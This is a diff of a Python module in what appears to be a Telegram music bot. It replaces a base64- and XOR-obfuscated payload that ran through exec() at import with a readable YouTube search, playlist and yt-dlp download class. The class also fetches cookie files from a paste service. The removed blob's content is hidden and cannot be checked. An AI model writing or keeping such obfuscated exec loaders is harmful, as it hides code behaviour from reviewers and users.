@@ -3,12 +3,163 @@
 # This file is part of LilyMusic
 # ALONE-CODER
 
-import base64
+import os
+import re
+import asyncio
+import aiohttp
+import random
+import yt_dlp
+from py_yt import Playlist, VideosSearch
+from Lily import logger
+from Lily.helpers import Track, utils
 
-def xor_cipher(data, key):
-    return bytearray([b ^ key[i % len(key)] for i, b in enumerate(data)])
+DOWNLOAD_DIR = "downloads"
 
-_encoded_payload = "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"
-_key = b"ALONE-CODER"
 
-exec(xor_cipher(base64.b64decode(_encoded_payload), _key).decode("utf-8"), globals())
+class YouTube:
+    def __init__(self):
+        self.base = "https://www.youtube.com/watch?v="
+        self.cookies = []
+        self.checked = False
+        self.cookie_dir = "Lily/cookies"
+        self.warned = False
+        self.regex = re.compile(
+            r"(https?://)?(www\.|m\.|music\.)?"
+            r"(youtube\.com/(watch\?v=|shorts/|playlist\?list=)|youtu\.be/)"
+            r"([A-Za-z0-9_-]{11}|PL[A-Za-z0-9_-]+)([&?][^\s]*)?"
+        )
+
+    def get_cookies(self):
+        if not self.checked:
+            if os.path.exists(self.cookie_dir):
+                for file in os.listdir(self.cookie_dir):
+                    if file.endswith(".txt"):
+                        self.cookies.append(f"{self.cookie_dir}/{file}")
+            self.checked = True
+        if not self.cookies:
+            if not self.warned:
+                self.warned = True
+                logger.warning("Cookies are missing; downloads might fail.")
+            return None
+        return random.choice(self.cookies)
+
+    async def save_cookies(self, urls: list[str]) -> None:
+        logger.info("Saving cookies from urls...")
+        if not os.path.exists(self.cookie_dir):
+            os.makedirs(self.cookie_dir)
+        async with aiohttp.ClientSession() as session:
+            for i, url in enumerate(urls):
+                path = f"{self.cookie_dir}/cookie_{i}.txt"
+                link = "https://batbin.me/api/v2/paste/" + url.split("/")[-1]
+                try:
+                    async with session.get(link) as resp:
+                        resp.raise_for_status()
+                        with open(path, "wb") as fw:
+                            fw.write(await resp.read())
+                except Exception as e:
+                    logger.warning(f"Failed to save cookie from {url}: {e}")
+        logger.info(f"Cookies saved in {self.cookie_dir}.")
+
+    def valid(self, url: str) -> bool:
+        return bool(re.match(self.regex, url))
+
+    async def search(self, query: str, m_id: int, video: bool = False) -> Track | None:
+        try:
+            _search = VideosSearch(query, limit=1, with_live=False)
+            results = await _search.next()
+            if results and results["result"]:
+                data = results["result"][0]
+                return Track(
+                    id=data.get("id"),
+                    channel_name=data.get("channel", {}).get("name"),
+                    duration=data.get("duration"),
+                    duration_sec=utils.to_seconds(data.get("duration")),
+                    message_id=m_id,
+                    title=data.get("title")[:25],
+                    thumbnail=data.get("thumbnails", [{}])[-1].get("url", "").split("?")[0],
+                    url=data.get("link"),
+                    view_count=data.get("viewCount", {}).get("short"),
+                    video=video,
+                )
+        except Exception as e:
+            logger.warning(f"YouTube search error: {e}")
+        return None
+
+    async def playlist(self, limit: int, user: str, url: str, video: bool) -> list[Track | None]:
+        tracks = []
+        try:
+            plist = await Playlist.get(url)
+            for data in plist["videos"][:limit]:
+                track = Track(
+                    id=data.get("id"),
+                    channel_name=data.get("channel", {}).get("name", ""),
+                    duration=data.get("duration"),
+                    duration_sec=utils.to_seconds(data.get("duration")),
+                    title=data.get("title")[:25],
+                    thumbnail=data.get("thumbnails", [{}])[-1].get("url", "").split("?")[0],
+                    url=data.get("link", "").split("&list=")[0],
+                    user=user,
+                    view_count="",
+                    video=video,
+                )
+                tracks.append(track)
+        except Exception as e:
+            logger.warning(f"Playlist fetch error: {e}")
+        return tracks
+
+    async def download(self, video_id: str, video: bool = False) -> str | None:
+        if not video_id or len(video_id) < 11:
+            return None
+
+        os.makedirs(DOWNLOAD_DIR, exist_ok=True)
+        ext = "mp4" if video else "mp3"
+        file_path = os.path.join(DOWNLOAD_DIR, f"{video_id}.{ext}")
+
+        if os.path.exists(file_path) and os.path.getsize(file_path) > 1024:
+            return file_path
+
+        url = f"{self.base}{video_id}"
+        cookie_file = self.get_cookies()
+
+        ydl_opts = {
+            "format": "bestvideo+bestaudio/best" if video else "bestaudio/best",
+            "outtmpl": os.path.join(DOWNLOAD_DIR, f"{video_id}.%(ext)s"),
+            "quiet": True,
+            "no_warnings": True,
+            "noprogress": True,
+            "extractor_args": {"youtube": {"player_client": ["android"]}},
+        }
+
+        if cookie_file:
+            ydl_opts["cookiefile"] = cookie_file
+
+        if not video:
+            ydl_opts["postprocessors"] = [{
+                "key": "FFmpegExtractAudio",
+                "preferredcodec": "mp3",
+                "preferredquality": "192",
+            }]
+
+        try:
+            loop = asyncio.get_event_loop()
+            info = await loop.run_in_executor(None, lambda: self._run_ydl(url, ydl_opts))
+            if info and os.path.exists(file_path) and os.path.getsize(file_path) > 1024:
+                return file_path
+        except Exception as e:
+            logger.warning(f"yt-dlp download error for {video_id}: {e}")
+
+        # Cleanup partial files
+        if os.path.exists(file_path):
+            try:
+                os.remove(file_path)
+            except:
+                pass
+        return None
+
+    def _run_ydl(self, url: str, opts: dict) -> dict | None:
+        with yt_dlp.YoutubeDL(opts) as ydl:
+            try:
+                return ydl.extract_info(url, download=True)
+            except Exception as e:
+                logger.warning(f"yt-dlp extract error: {e}")
+                return None
